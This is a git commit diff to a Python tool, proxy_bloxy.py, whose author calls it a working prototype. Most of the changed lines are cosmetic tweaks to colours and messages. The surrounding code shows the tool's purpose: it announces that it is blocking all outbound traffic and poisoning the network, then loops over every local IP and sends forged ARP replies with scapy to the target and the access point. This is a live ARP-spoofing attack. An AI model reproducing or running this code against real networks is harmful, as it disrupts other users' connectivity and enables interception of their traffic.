456999d53653fe1ac30cbc319db567e91d4c9b5b
Crowfunder <iamcrowfunder@gmail.com>
2020-01-10 18:56:24 +0100

    More fixes. Right now it's a WORKING prototype.

--- proxy_bloxy.py
+++ proxy_bloxy.py
@@ -6,9 +6,9 @@ import sys,os,argparse,subprocess
 FOUND = '\033[2;37;42m'
 ERR = '\033[0;31;40m'
 BAD_ERR = '\033[1;30;41m'
-GREEN = '\033[1;32;40m'
+GREEN = '\033[0;32;40m'
 LOGO = '\033[1;35;47m'
-NONE = '\033[1;37;40m'
+NONE = '\033[0m'
 ip_list = []
 target_ip = ""
 ap_ip = ""
@@ -97,7 +97,7 @@ def proxier(ap_ip, interface):
     try:
         ap_mac = get_mac_address(ap_ip, interface)
         print(ap_mac)
-        print(NONE + "Parsing available IP addresses...")
+        print(NONE + "Parsing available IP addresses, CTRL+C to stop if you wish...")
         ip_list = ip_parser(ap_ip)
         print(GREEN + "Done!" + NONE)
         print("Blocking entire outbound traffic...")
@@ -107,7 +107,7 @@ def proxier(ap_ip, interface):
         print("Starting to Poison the Network...")
         while 1 < 2:
             for target_ip in ip_list:
-                target_mac = get_mac_address(target_ip)
+                target_mac = get_mac_address(target_ip, interface)
                 try:
                     send(ARP(op = 2, pdst = target_ip, psrc = ap_ip, hwdst= target_mac))
                     send(ARP(op = 2, pdst = ap_ip, psrc = target_ip, hwdst= ap_mac))
